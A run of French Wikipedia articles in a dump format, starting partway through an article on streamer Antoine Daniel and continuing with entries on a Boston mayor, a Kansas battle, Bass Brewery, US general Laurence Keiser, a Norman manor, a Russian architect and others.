Comme inspirations, Antoine Daniel cite notamment le réalisateur britannique Edgar Wright et le vidéaste britannique TomSka avec qui il jouera dans le sketch "Le Alien". L'émission "What The Cut !?" est quant à elle inspirée d'un format similaire nommé "Equals Three" du vidéaste américain Ray William Johnson.
Activité sur YouTube.
"What The Cut !?".
Concept de base.
"What The Cut !?" est une émission humoristique créée par Antoine Daniel dont le premier épisode est mis en ligne le sur sa chaîne YouTube. Dans chaque épisode, Antoine Daniel examine trois vidéos drôles, insolites ou étranges, qu'il analyse, critique, et utilise pour créer des sketchs et des blagues. L'émission est alors hebdomadaire, et est remarquée pour son rythme et son montage rapide, ainsi que la personnalité extravagante voire insultante du personnage joué par Antoine Daniel.
Évolution de l'émission.
À partir de l'épisode 30, l'émission se voit augmentée d'un pré-générique. Des courts-métrages scénarisés dont la durée atteint parfois les quinze minutes font leur apparition à partir de l'épisode 34.
Polémiques et droits d'auteur.
La polémique n'est pas sans conséquence sur "What The Cut !?." Antoine Daniel prend la mesure des effets que son contenu peut produire sur son audience. Après cet événement, il ne mentionnera plus de personnes pouvant potentiellement souffrir d'un passage dans l'émission.
"What The Cut !?" est également la cible de nombreuses réclamations aux droits d'auteur. Plusieurs de ses vidéos sont démonétisés pour cette raison : , 13 des 70 vidéos sur sa chaîne principale sont démonétisées pour cette raison.
"Clyde Vanilla".
Le , Antoine Daniel annonce dans une vidéo qu'il travaille sur une série audio. Plus tard, il révèle que celle-ci sera une série humoristique de science-fiction intitulée "Clyde Vanilla", qu'il co-écrit et réalise avec l'auteur et comédien Wendoh. Une illustration représentant le logo de la série, ainsi qu'une musique composée par Antoine Daniel sont révélées sur les réseaux sociaux.
La première saison, de dix épisodes, sort entre septembre et novembre 2017 sur plusieurs plateformes, dont YouTube et Bandcamp. Il y réalise une partie de l'écriture, ainsi que le mixage, le montage, la musique et les bruitages. 
"La Mezzanine".
Créée le et officiellement annoncée le , cette chaîne permet à Antoine Daniel de mettre en ligne des vidéos qu'il ne destine pas à sa chaîne principale, comme des conférences, des making-of, et plus globalement des vidéos qu'il considère pas assez travaillées pour y paraître, renouant ainsi avec une liberté de création que les attentes du public de "What The Cut !?" avaient limitées. En , il y lance l'émission "Chaos" dont le but est de répondre de façon détaillée à des questions qui lui sont posées par des internautes. En , il sort deux vidéos nommées "Stock" et "Stock 2" dont le concept est de prendre des stock-shots et de les doubler de façon humoristique et absurde à la manière d'un zapping. Ces deux vidéos ont fait l'objet d'une réclamation de la société Shutterstock pour atteinte aux droits d'auteur et ont été retirées de la plateforme YouTube le . Après discussion, ils seront remis en ligne le . Il continuera la série en sortant "Stock 3" en .
Activité sur Twitch.
Depuis 2018, il concentre son activité sur le "streaming" de jeux vidéo via la plateforme Twitch. Au lendemain du Z Event 2020, il crée une chaîne YouTube où sont postées les rediffusions de ses lives, intitulée "Antoine Daniel - Les VOD". Il devient l'un des streamers français les plus suivis et regardés sur la plateforme.
En , il participe à l'événement caritatif Z Event organisé par ZeratoR et Dach, qui récolte plus de au profit de l'institut Pasteur. Il renouvelle sa participation, cette fois en distanciel, lors de l'édition 2020 du même évènement, pendant lequel plus de sont récoltés au profit d'Amnesty International. Il participe également au Z Event 2021, cette fois au profit de Action contre la faim avec un montant record de plus de récoltés, dont via sa chaine, à l'édition 2022 au profit des associations Sea Shepherd, The SeaCleaners, LPO et WWF, pour lesquelles plus de sont récoltés, dont via sa chaine, ainsi qu'à l'édition 2024 au profit des associations Bureaux du cœur, Chapitre 2, Cop1, Secours populaire et Solidarité paysans dont les dons s'élèveront à un total de , dont sur sa chaine uniquement, soit la deuxième derrière Domingo. En 2025, il dépasse le million d'euros sur sa cagnotte personnelle () et finit à nouveau deuxième cagnotte de l'événement, qui récolte plus de 16 millions d'euros pour des associations sur le thème de le santé et des soignants ou aidants.
En 2021, il participe également à l'événement "GTA RPZ" sur "Grand Theft Auto V", rassemblant plusieurs dizaines de streameurs. Début 2022, il participe au jeu de rôle sur table politique de FibreTigre et Clément Viktorovitch, "Game of Rôles - Les Deux Tours", organisé dans le cadre de l'élection présidentielle de 2022 et diffusé en direct.
En , il produit, diffuse et anime une compétition internationale e-sport sur le jeu "GeoGuessr", la "GeoGuessr Team World Cup". Fin 2022, Antoine Daniel débute un classement de 150 villes de France, avec une grille de lecture composée de 4 notes : vivre en ville, culture, histoire et « », qui amène plusieurs journaux régionaux français à relayer l'information voire à se féliciter de la position d'un de leurs chefs-lieux dans le classement.
À partir de , il fait partie des membres francophones invités (avec Aypierre, Baghera Jones, Etoiles et Kameto) au serveur "Minecraft" international et multilingue QSMP, lancé par le streameur et vidéaste mexicain . Il regroupe des créateurs de contenu du monde entier dans un même serveur, exploitant un système de traduction automatique en temps réel, et consistant à la fois en du divertissement « libre », et du jeu de rôle plus ou moins scripté. En mars 2024, Quackity et les administrateurs de QSMP font face à des accusations de travail dissimulé et de surcharge de travail de la part de bénévoles actifs sur le serveur. À la suite de cela, les participants francophones rédigent et envoient un communiqué privé à Quackity dénonçant ces conditions de travail, et trois décident de quitter le serveur, faute de garanties sur l'amélioration de ces conditions. Le serveur QSMP ferme finalement ses portes le 25 mai 2024.
Prises de positions.
Engagement politique.
Lors du ZEvent 2022, lui et la streameuse Angle Droit créent une polémique en accusant de manière injurieuse le président Emmanuel Macron de récupération politique et d'inaction après son message de félicitations adressé à l'événement, Antoine Daniel ajoutant notamment que que ces événements caritatifs sont nécessaires.
En , Antoine Daniel participe à la campagne caritative "#Streamers4Palestinians" (« streameurs pour les Palestiniens ») organisée par Baghera Jones, visant à collecter des fonds au profit de Médecins du monde pour aider leurs actions dans la bande de Gaza et en Cisjordanie durant la guerre Israël-Gaza en cours. L'opération permet de lever plus d'1 million d'euros en cinq jours.
Le même mois, en vue des élections législatives anticipées, il fait partie d'un appel de 200 vidéastes et streameurs qui appellent à voter pour le Nouveau Front populaire.
Rapport à Internet et YouTube.
Antoine Daniel a entretenu un rapport assez critique vis-à-vis de YouTube. Il explique notamment être contre ce qu'il appelle la course à l'argent et à la célébrité qu'il peut y avoir sur cette plateforme, une course au chiffre illustrée notamment dans le dernier épisode de "What the Cut !?". Il partage également la vision d'un internet libre, "", respectant la neutralité du net et la vie privée.
Il a également tenu pendant plusieurs années un format mensuel nommé "Le 29 avec Antoine Daniel", utilisé notamment pour mettre en valeur de plus petits vidéastes dont il était proche ou dont il jugeait le contenu intéressant. Il a ainsi participé à l'éclosion des carrières de chaînes comme celles du Fossoyeur de Films, Dany Caligula, E-penser, ou Axolot dans les années 2010.
Carrière musicale.
En 2020, il sort son album "Album 100% libre de droits pour Twitch" sur la chaine youtube "Best Of Antoine Daniel," un album de musiques libres de droits entièrement composé et enregistré en live sur twitch.
En 2022, il participe à la "Zizi Caca Mixtape", avec le titre "La Vériter", en collaboration avec la streameuse Baghera Jones.
En 2023, il participe à la chanson "The Void" de l'album "900K" du streameur, vidéaste et animateur ZeratoR.

</doc>
<doc id="9412824" url="https://fr.wikipedia.org/wiki?curid=9412824" title="Francis James Child">
Francis James Child



</doc>
<doc id="9412827" url="https://fr.wikipedia.org/wiki?curid=9412827" title="Kevin White (homme politique)">
Kevin White (homme politique)

Kevin Hagan White (né le , mort le ) est un homme politique américain du Parti démocrate, qui a été maire de Boston entre 1968 et 1984.

</doc>
<doc id="9412828" url="https://fr.wikipedia.org/wiki?curid=9412828" title="Les années folles">
Les années folles



</doc>
<doc id="9412834" url="https://fr.wikipedia.org/wiki?curid=9412834" title="Éléphant (dentifrice d')">
Éléphant (dentifrice d')



</doc>
<doc id="9412838" url="https://fr.wikipedia.org/wiki?curid=9412838" title="Rustington">
Rustington

 est une ville et une paroisse civile anglaise située dans le district d'Arun, dans le comté du Sussex de l'Ouest. En 2011, sa population était de .

</doc>
<doc id="9412839" url="https://fr.wikipedia.org/wiki?curid=9412839" title="Bataille de Black Jack">
Bataille de Black Jack

La bataille de Black Jack eut lieu près de Baldwin City, au Kansas, le , lorsque des anti-esclavagistes, dirigés par l'abolitionniste John Brown, attaquèrent le campement d'Henry C. Pate, qui avait participé le 21 mai au saccage de Lawrence.
La bataille fut un incident du « "Bleeding Kansas" et un des facteurs menant à la guerre de Sécession (1861-1865).
Le champ de bataille est inscrit au Registre national des lieux historiques et est un National Historic Landmark.

</doc>
<doc id="9412840" url="https://fr.wikipedia.org/wiki?curid=9412840" title="5088 Tancredi">
5088 Tancredi



</doc>
<doc id="9412846" url="https://fr.wikipedia.org/wiki?curid=9412846" title="DPCT">
DPCT



</doc>
<doc id="9412848" url="https://fr.wikipedia.org/wiki?curid=9412848" title="Antoine Daniel (youtuber)">
Antoine Daniel (youtuber)



</doc>
<doc id="9412850" url="https://fr.wikipedia.org/wiki?curid=9412850" title="Crise de l'université">
Crise de l'université



</doc>
<doc id="9412851" url="https://fr.wikipedia.org/wiki?curid=9412851" title="Antoine Daniel (youtubeur)">
Antoine Daniel (youtubeur)



</doc>
<doc id="9412856" url="https://fr.wikipedia.org/wiki?curid=9412856" title="Bass Brewery">
Bass Brewery

La Bass Brewery, ou brasserie Bass, (prononcé /ˈbæs/) fut fondée en 1777 par William Bass à Burton upon Trent au Royaume-Uni. La marque principale était la "Bass Pale Ale", qui fut un temps la bière la plus vendue au Royaume-Uni. En 1877, Bass était devenu la plus grande brasserie du monde avec une production annuelle d'un million de tonneaux. Elle était exportée dans tout l'Empire britannique et le triangle rouge représentant l'entreprise devint la première marque déposée du Royaume-Uni.
Histoire.
Avant d'établir une brasserie, William Bass transportait de la bière pour le brasseur Benjamin Printon. Bass vendit son commerce à la famille Pickord, en utilisant les fonds pour établir la Brasserie Bass (Bass &amp; Co Brewery) en 1777, l'une des premières brasseries à Burton-upon-Trent.

</doc>
<doc id="9412857" url="https://fr.wikipedia.org/wiki?curid=9412857" title="1903 en santé et médecine">
1903 en santé et médecine

Cet article présente les faits marquants de l'année 1903 en santé et médecine.

</doc>
<doc id="9412858" url="https://fr.wikipedia.org/wiki?curid=9412858" title="Église Saint-Remi d'Olizy">
Église Saint-Remi d'Olizy

L'église d'Olizy est une église catholique dédiée à Remi de Reims, située dans la Marne, en France.
Localisation.
L'église est située dans le département français de la Marne, sur la commune d'Olizy.
Historique.
L'édifice est bâti au puis remanié à plusieurs reprises jusqu'au . Il est classé monument historique.

</doc>
<doc id="9412859" url="https://fr.wikipedia.org/wiki?curid=9412859" title="Laurence B. Keiser">
Laurence B. Keiser

Laurence Bolton Keiser (1 juin 1895 - 20 octobre 1969) était un major général américain de l'United States Army qui a servi pendant la Première et la Seconde Guerre mondiale. Au début de la guerre de Corée, il a commandé la 2 division d'infanterie (2nd Infantry Division).
Biographie.
Jeunesse.
Laurence Bolton Keiser est né à Philadelphie, en Pennsylvanie, le 1 juin 1895. Il est diplômé de l'Académie militaire des États-Unis de West Point en 1917..
Il fait partie de la promotion qui a produit plus de 55 futurs officiers généraux, dont deux chefs d'état-major de l'armée de terre - Joseph L. Collins et Matthew B. Ridgway. Parmi ses autres camarades de classe figurent : Clare H. Armstrong, Aaron Bradshaw Jr., Mark W. Clark, John T. Cole, Norman D. Cota, John M. Devine, William W. Eagles, Theodore L. Futch, Charles H. Gerhardt, Augustus M. Gurney, Ernest N. Harmon, William Kelly Harrison Jr., Robert W. Hasbrouck, Frederick A. Irving, George H. Weems, Charles S. Kilburn, Bryant E. Moore, Daniel Noce, Onslow S. Rolfe, Herbert N. Schwarzkopf, Albert C. Smith, George D. Wahl et Raymond E. S. Williamson.
Carrière militaire.
Envoyé en France avec le corps expéditionnaire américain (American Expeditionary Force) pendant la Première Guerre mondiale, Keiser est rapidement promu "captain" (capitaine) temporaire et nommé au commandement du 1 bataillon du 6 régiment d'infanterie (6th Infantry Regiment), une unité de la 5 division d'infanterie (5th Infantry Division). Il reçoit la Silver Star pour ses actions sur le front occidental.
L'entre-deux-guerres.
Keiser est stationné avec le 15 régiment d'infanterie (15th Infantry Regiment) à Tientsin, en Chine, de mars 1920 à juin 1922. En 1923, il est diplômé du cours d'officiers de compagnie d'infanterie à Fort Benning. Il sert ensuite comme commandant de bataillon dans le 23 régiment d'infanterie (23rd Infantry Regiment) à Fort Sam Houston. De 1924 à 1928, Keiser est instructeur à West Point.
Après son affectation à West Point, Keiser retourne à Fort Sam Houston en tant que commandant d'une compagnie du 9 régiment d'infanterie (9th Infantry Regiment). En 1932, il suit le cours avancé d'officier d'infanterie à Fort Benning, après quoi il retourne à Fort Sam Houston en tant que conseiller et mentor pour les unités de l'réserve de l'US Army.
En 1939, Keiser est diplômé de l'United States Army Command and General Staff College, après quoi il est affecté à Fort Benning en tant qu'officier exécutif puis commandant du 29 régiment d'infanterie (29th Infantry Regiment).
Seconde Guerre mondiale.
En avril 1942, Keiser est nommé chef d'état-major du 3 corps d'armée (III Corps) à Fort McPherson. Il est ensuite chef d'état-major du 6 corps d'armée (VI Corps) pendant les campagnes d'Afrique du Nord et d'Italie. En janvier 1944, il est promu brigadier général (général de brigade) et affecté au poste de chef d'état-major de la 4 armée (Fourth Army) à Fort Sam Houston. Il retourne en Chine en 1948, cette fois en tant que membre du Groupe consultatif militaire des États-Unis auprès du gouvernement chinois nationaliste (Kuomintang).
Guerre de Corée.
En novembre 1948, Keiser est nommé commandant adjoint de la 2 division d'infanterie (2nd Infantry Division). En février 1950, son ancien camarade de classe de West Point, Joe Collins, lui confie le commandement de la division et le promeut au rang de major général (général de division). Après le déclenchement de la guerre de Corée, la 2 division est la première unité de l'US Army à arriver en Corée en provenance des États-Unis continentaux.
D'août à septembre, la division débarque à Pusan et se rend dans le défilé de Naktong pour aider la 24 division d'infanterie (24th Infantry Division), qui s'efforce alors de rétablir sa ligne de front après la traversée de la rivière Naktong par la 4 division nord-coréenne.
Lorsque les Nord-Coréens lancent la grande offensive du Nakdong, quatre divisions font face à la 2 division d'infanterie. Certaines unités de la 2 division d'infanterie ne se comportent pas bien lors du premier contact avec l'ennemi, et Keiser fait preuve d'un manque de connaissance de la situation de sa division lorsqu'il est confronté au lieutenant général Walton Walker, le commandant de la 8 armée (Eighth Army). Certains officiers considèrent déjà que Keiser est un peu trop âgé pour être un commandant de division exceptionnel.
La 2 division participe à la sortie du périmètre de Pusan, poussant vers le nord-ouest en direction de Kunsan, aux côtés de la 25 division d'infanterie (25th Infantry Division), et progresse largement en Corée du Nord, à proximité de la frontière entre la Chine et la Corée du Nord.
Fin novembre 1950, une importante force chinoise franchit le fleuve Yalu et lance une attaque surprise contre les forces des Nations unies dans ce qui sera connu comme la bataille du fleuve Chongchon. La 2 division avait progressé sur le flanc droit du 9 corps d'armée (IX Corps), qui poussait alors vers le fleuve Yalu, et était positionnée au nord de Kunu-ri, avec la 25 division d'infanterie sur son flanc gauche. Au cours d'une attaque rapide d'une semaine, les Chinois menacent d'envelopper la 8 armée, la 2 division étant exposée sur la droite et subissant le plus gros du mouvement d'enveloppement. La 25 division peut se replier sur Anju, mais Keiser ne parvient pas à obtenir l'autorisation du major général John B. Coulter de la suivre. La 2 division est finalement isolée et contrainte de se frayer un chemin à travers les Chinois pour se mettre à l'abri à Sunchon.
Après la bataille de la rivière Ch'ongch'on, au cours de laquelle la 2 division subit des pertes considérables d'environ 4 000 hommes, Keiser rencontre le major général Leven Cooper Allen, chef d'état-major de la 8 armée, à Séoul. Il est relevé de son commandement et remplacé par le major général Robert B. McClure, soi-disant pour des raisons médicales, bien qu'il ait le sentiment d'être le bouc émissaire des revers subis par les Nations unies à la suite de l'intervention chinoise dans la guerre.
Fin de carrière.
De retour aux États-Unis en février 1951, il prend le commandement de la 5 division d'infanterie (5th Infantry Division) à Indiantown Gap Military Reservation (IGMR), un camp d'entraînement de base de l'infanterie situé en Pennsylvanie, près de Hershey et Harrisburg. 
Il prend sa retraite en 1953 et s'installe à San Francisco. Le 20 octobre 1969, Keiser meurt à San Francisco. Il est enterré au cimetière de West Point.

</doc>
<doc id="9412860" url="https://fr.wikipedia.org/wiki?curid=9412860" title="Sanctuaire Madonna del Sangue">
Sanctuaire Madonna del Sangue

Le sanctuaire Madonne del Sangue est un sanctuaire marial sur la commune de Re. Dédié à la Sainte Vierge, il fut construit en 1494, là où il y aurait eu un miracle : une petite fresque de la "Madonna Lactans" fut frappée par une pierre et se serait mise à saigner.
Ce sanctuaire est la destination de plusieurs pèlerinages des alentours et il est le lieu religieux plus important du Val Vigezzo. Cette église est une étape de la Via del Mercato, une partie du parcours CoEur - Au cœur des chemins d'Europe.
Histoire et description.
Plus d'un siècle après le miracle, en 1627, l'évêque de Novara Carlo Bascapé inaugura le premier sanctuaire, bâti grâce à son initiative.
La basilique d'aujourd'hui en architecture néo-byzantine a été inaugurée le . Dessinée par l'architecte Edoardo Collamarini, elle a été construite entièrement par des maçons et artisans locaux. Elle fut élevée au rang de basilique mineure par le pape Pie XII en 1958.

</doc>
<doc id="9412862" url="https://fr.wikipedia.org/wiki?curid=9412862" title="3100 av. J.-C.">
3100 av. J.-C.



</doc>
<doc id="9412866" url="https://fr.wikipedia.org/wiki?curid=9412866" title="Matty Groves">
Matty Groves

Matty Groves, ou Little Musgrave and Lady Barnard, est une ballade populaire anglaise.
Elle porte le numéro 81 dans le recueil de ballades collectées par Francis James Child, "The English and Scottish Popular Ballads". Elle y est intitulée "Little Musgrave and Lady Barnard".
Son thème est celui d'une femme adultère, tuée avec son amant par l'époux.
Son aire de diffusion inclut l'Angleterre, l'Écosse, l'Irlande, les États-Unis, le Canada, la Jamaïque, Sainte-Croix et Saint-Vincent. Sa plus ancienne attestation remonte à 1611, puisqu'elle est citée dans la pièce "" de John Fletcher et Francis Beaumont (acte V, scène 3).

</doc>
<doc id="9412874" url="https://fr.wikipedia.org/wiki?curid=9412874" title="Bataille de l'Ametettaï">
Bataille de l'Ametettaï



</doc>
<doc id="9412896" url="https://fr.wikipedia.org/wiki?curid=9412896" title="Fredrik Gertten">
Fredrik Gertten

Carl Fredrik (von) Gertten (né le 3 avril 1956 à Malmö) est un réalisateur et un journaliste suédois.
Gertten a travaillé en tant que journaliste pour des journaux, des radios et des chaînes de télévision en Afrique, en Amérique Latine, en Asie et en Europe durant les années 1980 et 1990. En 1995, il a publié le livre de voyages "Ung man söker världen" ("Jeune homme à la recherche du Monde") chez l'éditeur Gong Gong förlag. Il a écrit pour le journal "Arbetet" de 1990 jusqu'à la fin de sa parution en 2000, et pour "" de 2001 à 2003. Il a aussi été le producteur de documentaires et d'émissions de divertissement pour les chaînes de télévision SVT, TV 4 et TV 3.
En 2009, la compagnie de production de Gertten, WG Film, fut attaquée en justice pour diffamation par la Dole Food Company à la suite de la retransmission aux États-Unis de "Bananas!*", un film documentaire sur le conflit entre Dole et des travailleurs de plantations de bananes au Nicaragua au sujet de cas présumés de stérilité causés par le pesticide DBCP. Le tribunal trancha en faveur de la compagnie de production et le procès devint le sujet du documentaire de Gertten, "Big Boys Gone Bananas!*" en 2011.

</doc>
<doc id="9412900" url="https://fr.wikipedia.org/wiki?curid=9412900" title="Manoir de Crémel">
Manoir de Crémel

La ferme-manoir de Crémel est une demeure, du , qui se dresse sur le territoire de la commune française de Monceaux-en-Bessin dans le département du Calvados, en région Normandie. L'édifice est inscrit au titre des monuments historiques.
Localisation.
La ferme-manoir est située à au nord de l'église Saint-Nicolas de Monceaux-en-Bessin, dans le département français du Calvados.
Historique.
La ferme manoir de Crémel est un exemple des « fermes-manoir du Bessin ». Elle a gardé, de façon unique dans le Bessin, une architecture originelle très peu altérée au cours des siècles donnant une grande homogénéité à l'ensemble.
 la construction du manoir actuel à Jean Le Patou, sieur de la Montagne, président en l’élection de Bayeux et conseiller en la cour des aides de Rouen. Jean Le Patou est devenu propriétaire du domaine aux portes de Bayeux le en garantie d’un prêt qu’il avait octroyé et qui n’avait pu être remboursé à la suite du décès de l’acheteur du domaine. La ferme manoir actuelle est alors élevée par Jean Le Patou vers 1642 sur les terres de Crémel citées depuis le premier tiers du . Il reste quelques éléments datant de la construction précédente. C'est son fils, également nommé Jean le Patou, sieur de Crémel et comme son père conseiller en la cour des aides de Rouen, qui en hérite.
À sa mort en 1670, à la suite de ses soucis judiciaires et de la saisie de ses biens par la chambre de justice, Crémel fut adjugé par le bailliage de Bayeux le au profit de Bernardin Gigault de Bellefonds (1630-1694), maréchal de France, marquis de Bellefonds, ambassadeur d'Espagne. Son fils Louis Christophe, mort au combat en 1692, a épousé Marie Olympe Mazarin, fille d’Hortense Mancini nièce du cardinal et considérée comme une des plus belles femmes de son temps. La cinquième génération, au travers de Charles Paul de Beauvilliers, grand d'Espagne, dernier duc de Saint-Aignan, comte de Buzançais (1746-1828) vendra Crémel le à Hervé Guillaume d’Aigneaux (1748-1816). Selon Bernard Gourbin, c'est la famille de la Bigne qui est au en possession du manoir et qui le conservera jusque dans la première moitié du .
À son décès, Crémel sera attribué à sa fille, Césarine d’Aigneaux (1784-1804), par un tirage au sort le . De son union avec Charles François Louis, baron de Sallen, naîtra en 1804 Charles Guillaume Léon de Sallen. Ce dernier vendra Crémel le , à Guillaume Mayet. Crémel est resté depuis dans la même famille.
De 1670 à 2000, la ferme-manoir a toujours été donnée en fermage et n’a donc jamais été habitée par ses propriétaires successifs.
Description.
On accède à la ferme-manoir, qui est close par un long mur d'enceinte, par un portail appareillé à refends, avec porte piétonne et porte charretière en plein cintre, encadré de deux bretèches soutenues par d'imposantes consoles. Côté cour, il est orné d'un cadran solaire.
Édifié à l’est de la cour, le logis seigneurial permettait de surveiller l’ensemble des bâtiments annexes. Cette importante construction en moellons calcaires de plan rectangulaire, à un étage, est percé de six baies irrégulièrement disposées. Il est flanqué à l'arrière d’une massive tour carrée ceinturée de cinq bandeaux de pierre horizontaux, et couverte d’un très haut toit indépendant en hache à quatre versants très inclinés avec à l’arrière une petite échauguette permettant de surveiller les champs. Outre les bandeaux de pierre et la corniche à modillons, le décor est principalement constitué par les cheminées et les lucarnes.
Le toit présente d’importantes proportions avec quatre souches de cheminées qui dominent le faîtage. Ces dernières sont hautes et solides, ornées aux angles d’un bel appareil en harpe et pourvues au sommet de quatre petits frontons. L’austérité de l’ardoise est relevée par des crêtes, des épis de faîtage en céramique.
Les lucarnes de la façade postérieure sont plus rustiques, mais celles sur la façade cour sont notables. Au-dessus d’un linteau à bossages, orné à chaque extrémité d’une sorte de crosse, un grand tableau rectangulaire porte une couronne accostée de rubans dessinant un cœur, le tout s’élevant en très faible relief, sur un fond troué de fines cupules en nids d’abeilles. Seule la grande lucarne subsistait en 2000 et la restitution des deux autres lucarnes et trois frontons sur le manoir a été faite depuis par analogie.
Il existe deux cadrans solaires : un sur le logis, un sur le portail en face. Celui-ci orienté vers l'est donne l'heure le matin, celui du manoir, orienté vers l'ouest donne l'heure le soir.
Le pressoir de Crémel est particulièrement important et très bien conservé ce qui en fait un élément rare dans le Bessin. .
Parmi les communs entourant le logis, on peut voir une charreterie, des écuries, une étable, une grange, le pressoir déjà cité et une boulangerie, sur lesquels ont relèvent de nombreux trous de boulins.
La ferme manoir a fait l'objet entre 2000 et 2014 d'une restauration complète et scrupuleuse qui lui a redonné sa place dans le et a assuré sa conservation pour de très nombreuses années. Cette restauration a été récompensée en 2015 au niveau national par un diplôme d'honneur des "Vieilles maisons françaises".
Protection.
Au titre des monuments historiques :

</doc>
<doc id="9412902" url="https://fr.wikipedia.org/wiki?curid=9412902" title="Tarride">
Tarride

Tarride est un nom de famille notamment porté par :

</doc>
<doc id="9412918" url="https://fr.wikipedia.org/wiki?curid=9412918" title="Illarion Ivanov-Schitz">
Illarion Ivanov-Schitz

Illarion Alexandrovitch Ivanov-Schitz (en ), né le au village de Mikhaïlovka dans l'oblast de Voronej et mort le à Moscou, est un architecte russe (puis russe soviétique), maître du style Art nouveau russe, appelé dans ces contrées "Modern Style". Son propre style mélange le vocabulaire Art nouveau de la Sécession viennoise avec des éléments inspirés de la Grèce antique. Il a travaillé à Moscou tout au long de sa carrière, construisant surtout des banques, des sièges de sociétés commerciales, des établissements d'enseignement, des cliniques, etc. Sous le nouveau régime soviétique, il a reconstruit le grand palais du Kremlin sous la salle de séances du Soviet suprême.
Biographie.
Ivanov-Schitz poursuit ses études au lycée moderne de Voronej, puis entre en 1883 à l'École d'architecture de Saint-Pétersbourg. Il reçoit à plusieurs reprises la médaille d'or. Après la fin de ses études en 1888, il fait un voyage d'études dans l'Empire allemand, en Autriche-Hongrie et en Suisse.
Il s'installe en 1889 à Moscou et travaille deux ans comme assistant de l'architecte de la ville, Max Hoeppener, puis comme ingénieur civil au département des constructions du gouvernement de Moscou. Il obtient le titre d'architecte de la ville en 1890 et un an plus tard fait partie du comité d'architecture du ministère de l'Intérieur. Il accomplit un grand voyage d'études en Europe occidentale en 1891-1892 et s'intéresse notamment à l'architecture d'Otto Wagner.
Au début de sa carrière, Ivanov-Schitz suit les tendances de l'historicisme architectural. Sa première commande importante avec Lev Kekouchev concerne la construction de gares, de dépôts et ateliers ferroviaires de la ligne Vologda-Arkhanguelsk (1895-1896). Il construit aussi plusieurs immeubles de rapport à Moscou et s'inspire de l'Art nouveau franco-belge qui devient très à la mode dans toute l'Europe du Nord. Ensuite il ajoute des éléments du "Jugenstil" viennois. En 1905, fort de ses succès, il dirige le département d'architecture de la municipalité de Moscou. Il est à l'apogée de sa carrière et construit des bâtiments importants avec des verticales modernes et des éléments à la grecque.
Dans les années 1920, il construit l'hôpital Botkine à Moscou, pendant la guerre civile russe. Ensuite après la guerre civile, il rénove des immeubles à Moscou pour le compte du commissariat du peuple aux finances. Il modernise une clinique ophtalmologique en 1929. Entre 1925 et 1936, il construit des maisons de repos et de vacances (appelées "sanatorium" en URSS) à Sotchi, Barvikha et Abastumani. Il rénove et reconstruit le grand palais du Kremlin dans les années 1930. Ce palais a retrouvé son style d'antan dans les années 1990.
Il reçoit l'ordre de Lénine. Il est enterré au cimetière du couvent de Novodiévitchi à Moscou.

</doc>
<doc id="9412924" url="https://fr.wikipedia.org/wiki?curid=9412924" title="Małgorzata Jasińska">
Małgorzata Jasińska

Małgorzata Jasińska, née le à Olsztyn, est une coureuse cycliste polonaise. Elle remporte le championnat de Pologne sur route en 2009, 2010, 2015 et 2018.
Biographie.
En 2015, sur l'épreuve en ligne des championnats du monde, elle prend l'échappée de neuf coureuses qui part à quarante kilomètres de l'arrivée. Dans le dernier tour, elle s'échappe seule. Elle se fait cependant reprendre. En 2023, elle est directeur sportif de l'équipe cycliste Le Col-Wahoo.

</doc>
<doc id="9412927" url="https://fr.wikipedia.org/wiki?curid=9412927" title="Rue d'Erfurth">
Rue d'Erfurth

La rue d'Erfurth est une ancienne voie de Paris, aujourd'hui disparue, située dans l'ancien (actuellement ).
Situation.
Longue de , elle reliait le portail sud de l'église de l'abbaye de Saint-Germain-des-Prés à la rue Sainte-Marguerite (partiellement reprise par l'actuelle rue Gozlin) dans l'alignement de la rue des Ciseaux. La rue Childebert, ouverte en même temps et également englobée dans le boulevard Saint-Germain, y aboutissait.
Historique.
Elle est ouverte en 1715 dans l'enclos de l'abbaye Saint-Germain-des-Prés en même temps que la rue Childebert et la rue Sainte-Marthe par Henri-Pons de Thiard de Bissy, abbé commendataire. D'abord baptisée « Petite-rue Sainte-Marguerite », elle est renommée en 1807 pour commémorer l'entrevue d'Erfurt qui eut lieu en . Une décision ministérielle du et une ordonnance royale du ont fixé la largeur de cette rue à .
Au carrefour avec la rue Childebert, le cardinal de Bissy fait construire en 1716 par Victor-Thierry Dailly deux fontaines identiques à chaque angle, dites fontaines Childebert. Une autre ordonnance du déclare d'utilité publique la démolition des échoppes situées sur le côté des numéros impairs afin d'élargir la voie. Les travaux sont exécutés en 1842. À cette occasion disparait la partie droite de la "porta major", ou porte de Sainte-Marguerite, construite vers 1690 pour accéder à l’enclos de l’abbaye, la partie gauche subsistant à l'angle de la rue d'Erfurth et de la rue Sainte-Marguerite. La rue disparait lors du percement de la rue de Rennes en 1867 et du boulevard Saint-Germain en 1876 dans le cadre des travaux de transformations de Paris sous le Second Empire. Les fontaines Childebert sont démontées en 1867 : l’une est remontée en 1875 dans le square Monge (aujourd’hui square Paul-Langevin) et l’autre est déposée au musée Carnavalet. Le square Félix-Desruelles occupe l'emplacement de la rue.

</doc>
<doc id="9412928" url="https://fr.wikipedia.org/wiki?curid=9412928" title="MrAntoineDaniel">
MrAntoineDaniel



</doc>
<doc id="9412930" url="https://fr.wikipedia.org/wiki?curid=9412930" title="Lisa Roman">
Lisa Roman

Lisa Roman, née le , est une rameuse canadienne.

</doc>
<doc id="9412934" url="https://fr.wikipedia.org/wiki?curid=9412934" title="John McDonnell (homme politique britannique)">
John McDonnell (homme politique britannique)

John McDonnell, né le à Liverpool, est un syndicaliste et homme politique britannique, membre du Parti travailliste. Il a été Chancelier de l'Échiquier du cabinet fantôme de septembre 2015 à avril 2020.
Origines et études.
Il est issu d'un milieu ouvrier. Son père est docker, puis, lorsque le chômage frappe les docks de Liverpool, devient conducteur de bus. Il est également secrétaire local du Syndicat des travailleurs des transports ("Transport and General Workers' Union"). John McDonnell effectue ses études secondaires dans une "grammar school" (école sélective pour les meilleurs élèves) à Great Yarmouth, mais arrête sa scolarité à l'âge de 17 ans pour travailler comme employé de magasin. Il enchaîne une succession d'emplois non qualifiés, et reprend ses études, d'abord dans un institut d'études techniques à Burnley, où il étudie la sociologie et l'histoire économique. À l'âge de 23 ans il entre à l'Université Brunel, où il obtient une licence en sciences politiques. Marié jeune puis divorcé, en parallèle à ses études il aide son ex-épouse à s'occuper d'une dizaine d'enfants dans un foyer pour enfants orphelins ou retirés à leurs parents. Il obtient par la suite un diplôme de Master en sciences politiques et en sociologie au Birkbeck College de l'Université de Londres.
Débuts.
